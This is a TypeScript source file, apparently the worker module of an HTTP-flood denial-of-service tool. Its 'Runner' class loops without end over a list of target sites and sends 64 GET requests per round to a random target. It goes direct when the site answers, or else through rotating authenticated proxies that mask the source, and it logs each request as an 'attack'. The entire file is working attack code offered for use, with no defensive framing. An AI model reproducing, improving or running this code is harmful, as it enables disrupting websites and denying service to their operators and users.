import { EventEmitter } from 'events'
import axios, { AxiosError } from 'axios-https-proxy-fix'
import { TargetData, ProxyData, SiteData } from './worker.types'
import { AxiosProxyConfig } from 'axios'

export class Runner {
  private sites: SiteData[]
  private proxies: ProxyData[]
  private readonly onlyProxy: boolean
  private readonly ATTACKS_PER_TARGET = 64
  private active = false
  public readonly eventSource: EventEmitter

  constructor (props: { sites: SiteData[]; proxies: ProxyData[]; onlyProxy: boolean }) {
    this.sites = props.sites
    this.proxies = props.proxies
    this.onlyProxy = props.onlyProxy
    this.eventSource = new EventEmitter()
  }

  async start () {
    this.active = true
    while (this.active) {
      try {
        await this.sendTroops()
      } catch (error) {
        this.active = false
        throw error
      }
    }
  }

  stop () {
    this.active = false
  }

  updateConfiguration (config: { sites: SiteData[]; proxies: ProxyData[]; }) {
    this.sites = config.sites
    this.proxies = config.proxies
  }

  private async sendTroops () {
    const target = {
      site: this.sites[Math.floor(Math.random() * this.sites.length)],
      proxy: this.proxies
    } as TargetData

    // check if direct request can be performed
    let directRequest = false
    if (!this.onlyProxy) {
      try {
        const response = await axios.get(target.site.url, { timeout: 10000 })
        directRequest = response.status === 200
      } catch (e) {
        console.debug((e as Error).message)
        this.eventSource.emit('error', { error: e })
        directRequest = false
      }
    }

    let proxy = null
    for (let attackIndex = 0; (attackIndex < this.ATTACKS_PER_TARGET); attackIndex++) {
      if (!this.active) {
        break
      }
      try {
        if (directRequest) {
          const r = await axios.get(target.site.url, { timeout: 5000, validateStatus: () => true })
          this.eventSource.emit('attack', { url: target.site.url, log: `${target.site.url} | DIRECT | ${r.status}` })
        } else {
          if (proxy === null) {
            proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
          }
          const proxyObj: AxiosProxyConfig = {
            host: proxy.ip,
            port: proxy.http_port
          }

          if (proxy.username && proxy.password) {
            proxyObj.auth = { username: proxy.username, password: proxy.password }
          }

          const r = await axios.get(target.site.url, {
            timeout: 10000,
            validateStatus: () => true,
            proxy: proxyObj
          })

          this.eventSource.emit('attack', { url: target.site.url, log: `${target.site.url} | PROXY | ${r.status}` })

          if (r.status === 407) {
            console.log(proxy)
            proxy = null
          }
        }
      } catch (e) {
        proxy = null
        const code = (e as AxiosError).code || 'UNKNOWN'
        if (code === 'UNKNOWN') {
          console.error(e)
        }

        this.eventSource.emit('attack', { type: 'atack', url: target.site.url, log: `${target.site.url} | ${code}` })
        if (code === 'ECONNABORTED') {
          break
        }
      }
    }
  }
}
